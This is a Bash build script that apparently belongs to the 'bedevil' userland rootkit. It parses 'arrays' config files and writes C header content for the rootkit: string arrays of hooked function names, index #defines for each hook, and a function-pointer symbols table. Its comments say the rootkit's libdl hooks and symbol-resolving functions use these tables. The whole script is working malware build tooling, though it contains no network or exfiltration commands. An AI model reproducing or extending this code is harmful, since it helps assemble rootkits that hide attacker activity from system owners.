get_arrayname(){ # returns the name of the current array we're going through
                 # $1 = current array line
    IFS=':' read -r array_name array_elements <<< "$1"
    echo -n "$array_name"
}
get_arrayelems(){ # returns the elements within the array we're checking
                  # $1 = current array line
    IFS=':' read -r array_name array_elements <<< "$1"

    # array_elements = '(skip)' if the toggle pertaining to the array
    # is disabled.
    array_elements="`cut_toggle_str "$array_elements"`"
    echo -n "$array_elements"
}

get_hooks(){ # $1 = arrays file path
    local hooks location contents \
          array_name array_elements

    location=$1
    contents="`read_cfg $location`"

    while read -r line; do
        array_name="`get_arrayname "$line"`"
        array_elements="`get_arrayelems "$line"`"

        # skip, if:
        # a: array's toggle is disabled
        # b: array is not an array of function names
        [ "$array_elements" == "(skip)" ] || \
        [[ $array_name != *"_calls"* ]] && continue

        # parse function names (array_elements) and add them to 'hooks'.
        # this array is later written to bedevil.h.
        IFS=',' read -a split_array_elements <<< "$array_elements"
        for current_hook in ${split_array_elements[@]}; do hooks+=($current_hook); done
    done <<< "$contents"

    echo -n "${hooks[*]}"
}

find_char_arrays(){
    local arrays_locations header_dirs
    header_dirs=(`get_header_dirs`)

    for dir in ${header_dirs[@]}; do
        # for every header include's directory, look for an 'arrays' file
        # within it.
        local arrays_path=$dir/arrays
        [ ! -f $arrays_path ] && continue

        # if the path of the current 'arrays' file has already been added,
        # don't add it again.
        [[ "${arrays_locations[*]}" == *"$arrays_path"* ]] && continue

        arrays_locations+=($arrays_path)  # got an 'arrays' file, add it to our list.
    done

    echo -n "${arrays_locations[*]}"
}

# build a C array for writing to a header and echo it out.
# $1 = name of the array.
# $2 = array elements.
# $3 = no. of elements in array. (array size)
build_array(){
    local nam arr carr asize
    nam=$1; arr=$2

    # firstly, define the array's size, i.e.: (uppercase)
    #   '#define $1_SIZE $3'
    asize="#define `echo -n ${nam} | awk '{print toupper($0)}'`_SIZE $3"

    # begin building the C array. include the array's size definition
    # at the beginning.
    carr="\n${asize}\nstatic char *${nam}[`echo -n ${asize} | awk '{print $2}'`] = {"
    for e in ${arr[@]}; do carr+="\"$e\","; done # append the array's current element onto
                                                 # the C array, encapsulating it within
                                                 # essential quotation marks.

    # remove the final comma seperating the array's elements before
    # closing it off and echoing it out.
    echo -n "${carr::${#carr}-1}};\n"
}

# using this & by looping through every 'arrays' file found
# by `find_char_arrays`, build C arrays for every array
# defined within the current file.
buildall_char_arrays(){ # $1 = arrays file path
    local contents char_arrays location \
          array_name array_elements

    # fetch the current 'arrays' path and read it.
    location=$1
    contents="`read_cfg $location`"

    # for every array definition in the current file, try to
    # build a C array for it.
    while read -r line; do
        array_name="`get_arrayname "$line"`"
        array_elements="`get_arrayelems "$line"`"

        # skip building the current array in the current 'arrays' file
        # if it's not needed.
        [ "$array_elements" == "(skip)" ] && continue

        # sort elements into a list and build our char array.
        # append it onto the final string.
        IFS=',' read -a split_array_elements <<< "$array_elements"
        char_arrays+="`build_array "$array_name" \
                                   "${split_array_elements[*]}" \
                                    ${#split_array_elements[*]}`"
    done <<< "$contents"

    # done parsing file & building respective arrays.
    # show me the $$$
    echo -n "$char_arrays"
}

write_char_arrays(){
    local char_arrays locations hooks

    # get all 'arrays' file paths
    locations=(`find_char_arrays`)

    for location in ${locations[@]}; do
        # for the current 'arrays' path, build the C arrays that are
        # defined within it.
        char_arrays+="`buildall_char_arrays $location`"

        # in case there are function names within an array to be built,
        # check the 'arrays' file and add any possible function names
        # to the 'hooks' array here.
        hooks+=(`get_hooks $location`)
    done

    # regarding any hooks that were added just above when reading the 'arrays'
    # files, build a C array for all of them and call it 'all'. this is utilized
    # by the libdl hooks and other similar symbol-resolving functions within the rootkit.
    char_arrays+="`build_array "all" "${hooks[*]}" ${#hooks[*]}`"

    # define index references for all of the hooks within the 'all' array.
    # this is of utmost importance, as this is how we resolve symbols in the rootkit,
    # via the hook(INDEX) macro.
    for i in "${!hooks[@]}"; do char_arrays+="#define C`echo ${hooks[i]} | awk '{print toupper($0)}'` $i\n"; done

    # finally, define our struct array of function pointers for our resolved
    # symbols to live. after using hook(INDEX), using call(INDEX, ...) references
    # symbols[INDEX].func(...)
    char_arrays+="syms symbols[ALL_SIZE];\n"

    # all done. we should be good to go.
    printf "\n$char_arrays"
}